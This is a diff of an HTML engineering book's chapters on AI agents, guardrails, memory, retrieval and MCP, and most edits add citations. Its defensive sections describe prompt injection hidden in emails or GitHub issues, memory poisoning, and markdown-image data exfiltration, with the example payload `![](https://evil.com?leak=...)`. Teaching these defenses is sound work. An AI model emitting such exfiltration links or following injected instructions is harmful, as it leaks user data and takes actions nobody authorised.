 <p class="annotatable" data-anchor="ch12-b01">A standard RAG pipeline is a <strong>railroad track</strong>: every user query goes through <code>Retrieve -&gt; Rerank -&gt; Generate</code> in a fixed number of steps.</p>
 <p class="annotatable" data-anchor="ch12-b02">An <strong>AI Agent</strong> is an <strong>open loop</strong> (<code>Thought -&gt; Tool Call -&gt; Observation -&gt; Thought...</code>): the LLM itself decides which tools to call, inspects the output, and decides when to stop <a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[1, 2]</a>.</p>
 <p class="annotatable" data-anchor="ch12-b03">That flexibility is magical in a demo—and terrifying in production when an agent gets stuck in an infinite retry loop, burns <code>$50</code> of tokens on a single user request, or gets tricked by a <strong>Prompt Injection</strong> hidden inside an email into calling <code>delete_account()</code>.</p>
@@ -2190,9 +2171,9 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </tr>
 <tr class="annotatable" data-anchor="ch12-d04">
 <td><strong>3. Security &amp; Confused Deputy</strong></td>
-<td><strong>Confused Deputy</strong> (agent uses its own broad service-account key on behalf of an unprivileged user) or <strong>data exfiltration via URLs/markdown images</strong>.</td>
+<td><strong>Confused Deputy</strong> (agent uses its own broad service-account key on behalf of an unprivileged user) or <strong>data exfiltration via URLs/markdown images</strong> <a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[5]</a>.</td>
 <td>Audit log shows resource tenant/ACL mismatch; outbound URL domain not in allow-list.</td>
-<td>Exchange caller&#x27;s token via <strong>OAuth On-Behalf-Of (OBO)</strong> (never shared admin keys!); strip external markdown image rendering (<code>![](https://evil.com?leak=...)</code>) in the UI.</td>
+<td>Exchange caller&#x27;s token via <strong>OAuth On-Behalf-Of (OBO, RFC 8693)</strong> <a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[4]</a> (never shared admin keys!); strip external markdown image rendering (<code>![](https://evil.com?leak=...)</code>) in the UI <a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[5]</a>.</td>
 </tr>
 </tbody></table></div>
 </div></details>
@@ -2225,8 +2206,8 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </ol>
 <ul>
 <li class="annotatable" data-anchor="ch12-d07"><strong>Code Assertions (100% deterministic):</strong> Schema validity, forbidden-tool absence, citation ID existence, cost/step bounds.</li>
-<li class="annotatable" data-anchor="ch12-d08"><strong>Calibrated LLM Judge:</strong> Graded on binary <code>PASS/FAIL</code> criteria and periodically benchmarked against <strong>100 human-labeled gold traces</strong> (requiring Cohen&#x27;s <code>κ &gt;= 0.80</code> agreement with domain experts) <a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[3]</a>.</li>
-<li class="annotatable" data-anchor="ch12-d09"><strong>Adversarial Regression Slice (<code>50+</code> red-team prompts):</strong> Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict <strong><code>0%</code> attack success rate</strong> to merge.</li>
+<li class="annotatable" data-anchor="ch12-d08"><strong>Calibrated LLM Judge:</strong> Graded on binary <code>PASS/FAIL</code> criteria and periodically benchmarked against <strong>100 human-labeled gold traces</strong> (requiring Cohen&#x27;s <code>κ &gt;= 0.80</code> agreement with domain experts) <a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[3, 6]</a>.</li>
+<li class="annotatable" data-anchor="ch12-d09"><strong>Adversarial Regression Slice (<code>50+</code> red-team prompts):</strong> Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict <strong><code>0%</code> attack success rate</strong> to merge <a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[5]</a>.</li>
 </ul>
 <ol>
 <li value="2" class="annotatable" data-anchor="ch12-d10"><strong>Design Drill — How Do You Let an Agent Modify a Git Repository Safely?</strong></li>
@@ -2261,9 +2242,11 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li class="annotatable" data-anchor="ch12-b25"><strong><a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Anthropic Engineering, <em>Building Effective Agents</em> (2024) — <a href="https://www.anthropic.com/research/building-effective-agents" target="_blank" rel="noopener">anthropic.com/research/building-effective-agents</a></li>
 <li class="annotatable" data-anchor="ch12-b26"><strong><a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Chip Huyen, <em>AI Engineering: Building Applications with Foundation Models</em> (O&#x27;Reilly, 2025) — Evaluation, Guardrails &amp; Agent Loops</li>
 <li class="annotatable" data-anchor="ch12-b27"><strong><a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Hamel Husain &amp; Eugene Yan, <em>Your AI Product Needs Evals</em> — <a href="https://applied-llms.org/" target="_blank" rel="noopener">applied-llms.org</a></li>
+<li class="annotatable" data-anchor="ch12-b28"><strong><a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> IETF RFC 8693, <em>OAuth 2.0 Token Exchange (On-Behalf-Of Delegation &amp; Audience Scoping)</em> — <a href="https://datatracker.ietf.org/doc/html/rfc8693" target="_blank" rel="noopener">datatracker.ietf.org/doc/html/rfc8693</a></li>
+<li class="annotatable" data-anchor="ch12-b29"><strong><a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> OWASP GenAI Security Project, <em>OWASP Top 10 for Large Language Model Applications (Prompt Injection &amp; Excessive Agency)</em> — <a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">genai.owasp.org/llm-top-10</a></li>
+<li class="annotatable" data-anchor="ch12-b30"><strong><a href="#ch12-refs" class="cite-ref" title="Jump to chapter references">[6]</a></strong> Lianmin Zheng et al., <em>Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena</em> (NeurIPS 2023) — <a href="https://arxiv.org/abs/2306.05685" target="_blank" rel="noopener">arxiv.org/abs/2306.05685</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch11')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">11. Production RAG &amp; ACL Security</span></button><button class="ch-pager-btn next" onclick="openChapter('ch13')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">13. Agent Loop Architectures</span></button></nav></article><article id="chap-ch13" class="chapter-article" data-ch="ch13"><h1 class="ch-title">Chapter 13: Agent Loop Architectures (ReAct, Plan-and-Execute &amp; Multi-Agent DAGs)</h1>
-<div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 8 min core · 18 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
+<div class="ch-kicker">Part IV · Autonomous Agent Systems · 8 min core · 18 min with deep dives</div>
 <p class="annotatable" data-anchor="ch13-b01">When people first hear <strong>&quot;AI Agent,&quot;</strong> they often picture something mystical—a digital coworker improvising freely inside a GPU.</p>
 <p class="annotatable" data-anchor="ch13-b02">Strip away the hype, and an AI Agent is a concrete control loop: <strong>an LLM that can inspect state, call external tools, read the results, and decide what to do next</strong> <a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[1, 2]</a>.</p>
 <p class="annotatable" data-anchor="ch13-b03">Yet the <em>shape</em> of that loop dictates whether a user waits <code>2.3 seconds</code> or <code>12 seconds</code>, whether a request costs <code>$0.004</code> or <code>$0.40</code>, and whether a failed API call recovers cleanly or traps the model in an infinite retry spiral <a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[1, 2, 3]</a>.</p>
@@ -2488,11 +2471,10 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li class="annotatable" data-anchor="ch13-b34"><strong><a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Shunyu Yao et al., <em>ReAct: Synergizing Reasoning and Acting in Language Models</em> (ICLR 2023) — <a href="https://arxiv.org/abs/2210.03629" target="_blank" rel="noopener">arxiv.org/abs/2210.03629</a></li>
 <li class="annotatable" data-anchor="ch13-b35"><strong><a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Anthropic Engineering, <em>Building Effective Agents</em> (2024) — <a href="https://www.anthropic.com/research/building-effective-agents" target="_blank" rel="noopener">anthropic.com/research/building-effective-agents</a></li>
 <li class="annotatable" data-anchor="ch13-b36"><strong><a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Sehoon Kim et al., <em>An LLM Compiler for Parallel Function Calling</em> (ICML 2024) — <a href="https://arxiv.org/abs/2312.04511" target="_blank" rel="noopener">arxiv.org/abs/2312.04511</a></li>
-<li class="annotatable" data-anchor="ch13-b37"><strong><a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> OpenAI, <em>A Practical Guide to Building Agents</em> (2025) — <a href="https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/" target="_blank" rel="noopener">openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents</a></li>
+<li class="annotatable" data-anchor="ch13-b37"><strong><a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Anthropic Engineering, <em>How We Built Our Multi-Agent Research System</em> (2025) — <a href="https://www.anthropic.com/research/multi-agent-research-system" target="_blank" rel="noopener">anthropic.com/research/multi-agent-research-system</a></li>
 <li class="annotatable" data-anchor="ch13-b38"><strong><a href="#ch13-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> OpenAI Developers, <em>Orchestrating Multiple Agents: Handoffs vs. Agents-as-Tools</em> (2025–2026) — <a href="https://developers.openai.com/api/docs/guides/agents/orchestration" target="_blank" rel="noopener">developers.openai.com/api/docs/guides/agents/orchestration</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch12')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">12. AI Agents, Guardrails &amp; Evals</span></button><button class="ch-pager-btn next" onclick="openChapter('ch14')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">14. Agent Memory &amp; KV Caching</span></button></nav></article><article id="chap-ch14" class="chapter-article" data-ch="ch14"><h1 class="ch-title">Chapter 14: Agent Memory (Working, Episodic, Semantic) &amp; KV Prompt Caching</h1>
-<div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 8 min core · 18 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
+<div class="ch-kicker">Part IV · Autonomous Agent Systems · 8 min core · 18 min with deep dives</div>
 <p class="annotatable" data-anchor="ch14-b01">By itself, an LLM has the memory of a goldfish: the microsecond an HTTP response finishes streaming, the model forgets you ever existed.</p>
 <p class="annotatable" data-anchor="ch14-b02">And you cannot fix that by pasting every past conversation into a 128,000-token prompt. If you try, <strong>&quot;Lost in the Middle&quot; attention decay</strong> drops recall by <code>20%–40%</code> on facts buried in the middle of the transcript <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[3]</a>, while recomputing attention over 80,000 tokens ruins Time-To-First-Token (<code>TTFT</code>).</p>
 <p class="annotatable" data-anchor="ch14-b03">Let us look at the lower half of the diagram in Chapter 13 to see how production agents combine a <strong>Multi-Tier Memory Hierarchy</strong> with <strong>GPU KV Prefix Caching</strong> <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[1, 2, 4]</a>.</p>
@@ -2518,7 +2500,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <td>Incident postmortem log</td>
 <td>Timestamped summaries of <strong>past trajectories</strong> (<em>&quot;Symptom X -&gt; Tool A failed -&gt; Tool B fixed it&quot;</em>).</td>
 <td><strong>Vector DB (<code>pgvector</code> / <code>Milvus</code>)</strong> + JSONB metadata</td>
-<td>Ranked by <strong>hybrid recency score</strong>: <code>0.65<em>CosineSim + 0.25</em>exp(-λ<em>hours) + 0.10</em>is_success</code> <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[1]</a>.</td>
+<td>Ranked by <strong>hybrid recency score</strong>: <code>0.65*CosineSim + 0.25*exp(-λ*hours) + 0.10*is_success</code> <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[1]</a>.</td>
 </tr>
 <tr class="annotatable" data-anchor="ch14-b08">
 <td><strong>3. Semantic Memory</strong> <em>(Long-Term Facts)</em></td>
@@ -2583,13 +2565,13 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li value="2" class="annotatable" data-anchor="ch14-d09"><strong>Token Budget Allocation (<code>24,000</code> Active Context Ceiling):</strong></li>
 </ol>
 <ul>
-<li class="annotatable" data-anchor="ch14-d10"><code>3,000</code> tokens: Static System Prompt + Tool Schemas (<strong>KV-cached</strong>).</li>
-<li class="annotatable" data-anchor="ch14-d11"><code>1,500</code> tokens: Top-5 <code>is_active</code> Semantic Repo/User facts + Top-2 matching Episodic debugging postmortems.</li>
-<li class="annotatable" data-anchor="ch14-d12"><code>7,500</code> tokens: On-demand AST/code chunks + triggered <strong>Procedural <code>SKILL.md</code></strong>.</li>
+<li class="annotatable" data-anchor="ch14-d10"><code>3,000</code> tokens: Static System Prompt + Tool Schemas (<strong>KV-cached</strong>) <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[4, 5]</a>.</li>
+<li class="annotatable" data-anchor="ch14-d11"><code>1,500</code> tokens: Top-5 <code>is_active</code> Semantic Repo/User facts + Top-2 matching Episodic debugging postmortems <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[1, 2]</a>.</li>
+<li class="annotatable" data-anchor="ch14-d12"><code>7,500</code> tokens: On-demand AST/code chunks + triggered <strong>Procedural <code>SKILL.md</code></strong> <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[2]</a>.</li>
 <li class="annotatable" data-anchor="ch14-d13"><code>12,000</code> tokens: Append-only Working Memory (compacted at <code>75%</code> fullness into a structured state checkpoint).</li>
 </ul>
 <ol>
-<li value="3" class="annotatable" data-anchor="ch14-d14"><strong>Security &amp; Memory Poisoning Defense:</strong> Scrub <code>.env</code> secrets/tokens before consolidation, and <strong>never auto-promote untrusted external text</strong> (e.g., an instruction hidden inside a third-party GitHub Issue) into persistent Semantic or Procedural Memory without explicit user confirmation—blocking persistent &quot;sleeper&quot; prompt injections!</li>
+<li value="3" class="annotatable" data-anchor="ch14-d14"><strong>Security &amp; Memory Poisoning Defense:</strong> Scrub <code>.env</code> secrets/tokens before consolidation, and <strong>never auto-promote untrusted external text</strong> (e.g., an instruction hidden inside a third-party GitHub Issue) into persistent Semantic or Procedural Memory without explicit user confirmation—blocking persistent &quot;sleeper&quot; prompt injections <a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[6]</a>!</li>
 </ol>
 </div></details>
 <hr class="wbw-divider"/>
@@ -2632,13 +2614,14 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <hr class="wbw-divider"/>
 <h3 id="ch14-refs" class="annotatable" data-anchor="ch14-b30">Sources &amp; References</h3>
 <ul>
-<li class="annotatable" data-anchor="ch14-b31"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Joon Sung Park et al., <em>Generative Agents: Interactive Simulacra of Human Behavior</em> (UIST 2023) — Recency, Relevance &amp; Importance Memory Scoring</li>
-<li class="annotatable" data-anchor="ch14-b32"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Theodore Sumers et al., <em>Cognitive Architectures for Language Agents (CoALA)</em> (TMLR 2024) — Working, Episodic, Semantic &amp; Procedural Memory</li>
+<li class="annotatable" data-anchor="ch14-b31"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Joon Sung Park et al., <em>Generative Agents: Interactive Simulacra of Human Behavior</em> (UIST 2023) — <a href="https://arxiv.org/abs/2304.03442" target="_blank" rel="noopener">arxiv.org/abs/2304.03442</a></li>
+<li class="annotatable" data-anchor="ch14-b32"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Theodore Sumers et al., <em>Cognitive Architectures for Language Agents (CoALA)</em> (TMLR 2024) — <a href="https://arxiv.org/abs/2309.02427" target="_blank" rel="noopener">arxiv.org/abs/2309.02427</a></li>
 <li class="annotatable" data-anchor="ch14-b33"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Nelson F. Liu et al., <em>Lost in the Middle: How Language Models Use Long Contexts</em> (TACL 2024) — <a href="https://arxiv.org/abs/2307.03172" target="_blank" rel="noopener">arxiv.org/abs/2307.03172</a></li>
-<li class="annotatable" data-anchor="ch14-b34"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Anthropic &amp; OpenAI Engineering, <em>Prompt Caching: KV-Cache Prefix Reuse for Multi-Turn Agents</em> (2024–2026)</li>
+<li class="annotatable" data-anchor="ch14-b34"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Anthropic Documentation, <em>Prompt Caching: KV-Cache Prefix Reuse for Multi-Turn Agents</em> — <a href="https://platform.claude.com/docs/en/build-with-claude/prompt-caching" target="_blank" rel="noopener">platform.claude.com/docs/en/build-with-claude/prompt-caching</a></li>
+<li class="annotatable" data-anchor="ch14-b35"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> Woosuk Kwon et al., <em>Efficient Memory Management for Large Language Model Serving with PagedAttention (vLLM)</em> (SOSP 2023) — <a href="https://arxiv.org/abs/2309.06180" target="_blank" rel="noopener">arxiv.org/abs/2309.06180</a></li>
+<li class="annotatable" data-anchor="ch14-b36"><strong><a href="#ch14-refs" class="cite-ref" title="Jump to chapter references">[6]</a></strong> OWASP GenAI Security Project, <em>OWASP Top 10 for LLM &amp; Agentic Applications (Memory Poisoning &amp; Indirect Injection)</em> — <a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">genai.owasp.org/llm-top-10</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch13')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">13. Agent Loop Architectures</span></button><button class="ch-pager-btn next" onclick="openChapter('ch15')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">15. Retrieval Math &amp; Vector Indexes</span></button></nav></article><article id="chap-ch15" class="chapter-article" data-ch="ch15"><h1 class="ch-title">Chapter 15: Retrieval Math (Recall@K, MRR, nDCG@K) &amp; Vector Indexes (pgvector vs Milvus)</h1>
-<div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 8 min core · 17 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
+<div class="ch-kicker">Part IV · Autonomous Agent Systems · 8 min core · 17 min with deep dives</div>
 <p class="annotatable" data-anchor="ch15-b01">When an enterprise RAG agent gives a wrong answer, who is at fault?</p>
 <p class="annotatable" data-anchor="ch15-b02">Did the <strong>Retriever</strong> fail to pull the right chunk out of 10 million documents, or did the <strong>Generator LLM</strong> misread the chunk sitting at Rank #1?</p>
 <p class="annotatable" data-anchor="ch15-b03">To isolate the Retriever from the Generator—and choose the right vector index (<code>HNSW</code> vs. <code>IVF</code>, <code>pgvector</code> vs. <code>Milvus</code>)—production teams track four retrieval metrics against a labeled ground-truth set <a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[1, 2]</a>.</p>
@@ -2762,8 +2745,8 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li value="2" class="annotatable" data-anchor="ch15-d03"><strong>Memory Sizing (<code>1,024-dim</code> embeddings):</strong></li>
 </ol>
 <ul>
-<li class="annotatable" data-anchor="ch15-d04">Uncompressed <code>float32</code> HNSW: <code>50M × 1,024 × 4B = 204.8 GB</code> + <code>~75 GB</code> graph overhead = <strong><code>~280 GB RAM</code></strong>.</li>
-<li class="annotatable" data-anchor="ch15-d05"><strong>Optimized (<code>SQ8</code> 8-bit quantized vectors in RAM + <code>float16</code> on NVMe SSD for rescoring):</strong> <code>50M × 1,024 × 1B ≈ 51 GB</code> + graph = <strong><code>~115 GB RAM</code></strong> across 2–3 replicated query nodes!</li>
+<li class="annotatable" data-anchor="ch15-d04">Uncompressed <code>float32</code> HNSW: <code>50M × 1,024 × 4B = 204.8 GB</code> + <code>~75 GB</code> graph overhead = <strong><code>~280 GB RAM</code></strong> <a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[2]</a>.</li>
+<li class="annotatable" data-anchor="ch15-d05"><strong>Optimized (<code>SQ8</code> 8-bit quantized vectors in RAM + <code>float16</code> on NVMe SSD for rescoring):</strong> <code>50M × 1,024 × 1B ≈ 51 GB</code> + graph = <strong><code>~115 GB RAM</code></strong> across 2–3 replicated query nodes <a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[3, 4]</a>!</li>
 </ul>
 <ol>
 <li value="3" class="annotatable" data-anchor="ch15-d06"><strong>Partitioning &amp; Pre-Filter Strategy:</strong> Partition keys by <code>tenant_id</code> (or physical shard by hash) so a tenant query touches <strong>1 partition (<code>&lt; 1M</code> chunks)</strong> instead of scanning a global 50M-node HNSW graph, keeping Stage-1 <code>BM25 + HNSW</code> p99 under <strong><code>25 ms</code></strong> (<code>ef_search = 64</code>) and Stage-2 Cross-Encoder reranking (<code>Top 40 -&gt; Top 5</code>) under <strong><code>45 ms</code></strong>.</li>
@@ -2795,7 +2778,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <details class="deep-dive"><summary class="deep-dive-summary"><span class="dd-left"><span class="dd-badge">🔬 Deep Dive</span><span class="dd-title">Zero-Downtime Embedding Model Upgrades (Dual-Index Cutover)</span></span><span class="dd-time">+4 min</span></summary><div class="deep-dive-body">
 <p class="annotatable" data-anchor="ch15-d07">What happens when you upgrade from <code>embed-v1</code> (<code>768-dim</code>) to <code>embed-v2</code> (<code>1,024-dim</code>)?</p>
 <ul>
-<li class="annotatable" data-anchor="ch15-d08"><strong>Vector Space Incompatibility:</strong> You <strong>cannot</strong> compare a <code>v2</code> query vector against <code>v1</code> document vectors—their coordinate spaces are orthogonal!</li>
+<li class="annotatable" data-anchor="ch15-d08"><strong>Vector Space Incompatibility:</strong> You <strong>cannot</strong> compare a <code>v2</code> query vector against <code>v1</code> document vectors—their coordinate spaces are orthogonal <a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[1, 4]</a>!</li>
 <li class="annotatable" data-anchor="ch15-d09"><strong>Blue/Green Shadow Migration:</strong></li>
 </ul>
 <ol>
@@ -2833,12 +2816,12 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <hr class="wbw-divider"/>
 <h3 id="ch15-refs" class="annotatable" data-anchor="ch15-b31">Sources &amp; References</h3>
 <ul>
-<li class="annotatable" data-anchor="ch15-b32"><strong><a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Christopher D. Manning, Prabhakar Raghavan &amp; Hinrich Schütze, <em>Introduction to Information Retrieval</em> — Chapter 8: Evaluation (<code>Recall@K</code>, <code>Precision@K</code>, <code>MRR</code>, <code>nDCG</code>)</li>
-<li class="annotatable" data-anchor="ch15-b33"><strong><a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Yu A. Malkov &amp; D. A. Yashunin, <em>Efficient and Robust Approximate Nearest Neighbor Search Using HNSW Graphs</em> (IEEE TPAMI 2020)</li>
+<li class="annotatable" data-anchor="ch15-b32"><strong><a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Christopher D. Manning, Prabhakar Raghavan &amp; Hinrich Schütze, <em>Introduction to Information Retrieval</em> (Cambridge Univ. Press) — Chapter 8: Evaluation (<code>Recall@K</code>, <code>Precision@K</code>, <code>MRR</code>, <code>nDCG</code>)</li>
+<li class="annotatable" data-anchor="ch15-b33"><strong><a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Yu A. Malkov &amp; D. A. Yashunin, <em>Efficient and Robust Approximate Nearest Neighbor Search Using HNSW Graphs</em> (IEEE TPAMI 2020) — <a href="https://arxiv.org/abs/1603.09320" target="_blank" rel="noopener">arxiv.org/abs/1603.09320</a></li>
 <li class="annotatable" data-anchor="ch15-b34"><strong><a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> <code>pgvector</code> Documentation — <em>HNSW, <code>halfvec</code> Quantization &amp; Iterative Filtered Scans</em> — <a href="https://github.com/pgvector/pgvector" target="_blank" rel="noopener">github.com/pgvector/pgvector</a></li>
+<li class="annotatable" data-anchor="ch15-b35"><strong><a href="#ch15-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Hugging Face &amp; Cohere Engineering, <em>Binary and Scalar Embedding Quantization for Significantly Faster &amp; Cheaper Retrieval</em> (2024) — <a href="https://huggingface.co/blog/embedding-quantization" target="_blank" rel="noopener">huggingface.co/blog/embedding-quantization</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch14')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">14. Agent Memory &amp; KV Caching</span></button><button class="ch-pager-btn next" onclick="openChapter('ch16')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">16. MCP, Tool Contracts &amp; Safety</span></button></nav></article><article id="chap-ch16" class="chapter-article" data-ch="ch16"><h1 class="ch-title">Chapter 16: Model Context Protocol (MCP), Tool Contracts &amp; Prompt Injection Defense</h1>
-<div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 8 min core · 19 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
+<div class="ch-kicker">Part IV · Autonomous Agent Systems · 8 min core · 19 min with deep dives</div>
 <p class="annotatable" data-anchor="ch16-b01">Connecting 5 internal AI agents to 10 enterprise microservices used to mean writing <strong>50 bespoke integration wrappers</strong> (<code>M × N</code> glue code), each with its own brittle JSON parser and ad-hoc retry logic.</p>
 <p class="annotatable" data-anchor="ch16-b02"><strong>MCP (Model Context Protocol)</strong> solves that the same way LSP solved code editors: a single <strong>JSON-RPC 2.0</strong> protocol (<code>stdio</code> locally or <strong>Streamable HTTP</strong> remotely) that decouples <strong>AI Applications (MCP Hosts &amp; Clients)</strong> from <strong>Capability Providers (MCP Servers)</strong> <a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[1]</a>.</p>
 <p class="annotatable" data-anchor="ch16-b03">Let us examine the upper half of the diagram in Chapter 15 to see how MCP primitives, self-healing tool contracts, and <strong>Indirect Prompt Injection</strong> defenses work together <a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[1, 2, 3]</a>.</p>
@@ -2870,7 +2853,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <td>Parameterized workflow templates (<code>diagnose-incident</code>) explicitly invoked via slash commands or UI.</td>
 </tr>
 </tbody></table></div>
-<details class="deep-dive"><summary class="deep-dive-summary"><span class="dd-left"><span class="dd-badge">🔬 Deep Dive</span><span class="dd-title">MCP Architecture (2026-07-28 Spec): 1:1 Host–Client–Server, Transports &amp; Wrapping REST</span></span><span class="dd-time">+5 min</span></summary><div class="deep-dive-body">
+<details class="deep-dive"><summary class="deep-dive-summary"><span class="dd-left"><span class="dd-badge">🔬 Deep Dive</span><span class="dd-title">MCP Architecture: 1:1 Host–Client–Server, Transports &amp; Wrapping REST</span></span><span class="dd-time">+5 min</span></summary><div class="deep-dive-body">
 <p class="annotatable" data-anchor="ch16-d01">Interviewers frequently test whether you confuse <strong>MCP</strong> with <strong>LLM function calling</strong> or <strong>REST microservices</strong> <a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[1]</a>:</p>
 <ol>
 <li value="1" class="annotatable" data-anchor="ch16-d02"><strong>The Strict <code>1:1</code> Connection Topology:</strong></li>
@@ -2919,8 +2902,8 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 6. Audit logger records immutable trace span (caller, args_hash, latency, status)
 7. Sanitized observation enters context -&gt; Model picks next step or terminates</code></pre>
 <ul>
-<li class="annotatable" data-anchor="ch16-d14"><strong>Why Step 5 (Output Validation) Matters:</strong> Tool outputs from web pages, Jira tickets, or logs are <strong>untrusted input</strong>! Validate output schemas, strip credentials/tokens accidentally returned by internal APIs, cap payload size (<code>&lt;= 4 KB</code>), and wrap untrusted text in explicit data delimiters.</li>
